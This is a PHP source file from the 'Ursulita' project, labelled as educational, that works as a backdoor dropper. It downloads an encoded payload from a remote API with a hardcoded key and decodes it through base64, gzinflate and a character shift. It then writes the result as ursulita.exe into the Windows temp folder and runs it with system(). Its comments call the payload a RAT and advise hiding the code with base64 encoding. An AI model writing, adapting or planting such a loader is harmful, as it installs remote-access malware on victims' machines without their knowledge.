<?php
/**
 * @Ursulita Project for educational purposes only.
 * @author Alaa Abdulridha
 * @copyright 2019
 * @Contact: https://alaa.blog
*/


function __autoload($class) {
    require 'classes/SETTING.php';
}
$apikey = "ursulita".sha1("3433"); //The API key.
$attack = "1"; //If you want to disable the backdoor just change it to 0 .
//The header.
$opts = array(
  'http'=>array(
    'method'=>"GET",
    'header'=>"Accept-language: en\r\n" .
              "Cookie: foo=bar\r\n"
  )
);
$ursulita = new SETTING();
$ursulita->apiurl();
$context = stream_context_create($opts);
	
	//From this line till last line should be base64 encoded to make sure that it's hidden.
	if($attack == "1") {  
									
	 $payload = file_get_contents ($ursulita->apiurl()."?key=".$apikey."&pp=assamble", false, $context);
            }
            else {

                return 0;
            }
           
			
$evalCode = gzinflate(base64_decode($payload)); // This function will decode the encoded data from API.php.
for($i=0;$i<strlen($evalCode);$i++)
 {
$evalCode[$i] = chr(ord($evalCode[$i])-1);
 }
$tmpdir ="C:\\windows\\temp"; // The RAT direction inside the system.
chdir($tmpdir);
$filename = "ursulita.exe"; 
$file = fopen($filename, 'wb');
fwrite($file, $evalCode); // create the RAT .
fclose($file);
$path = $filename;
$cmd = $path;
$output = system($cmd); // This line gonna excute the RAT using system() function .
			        
?>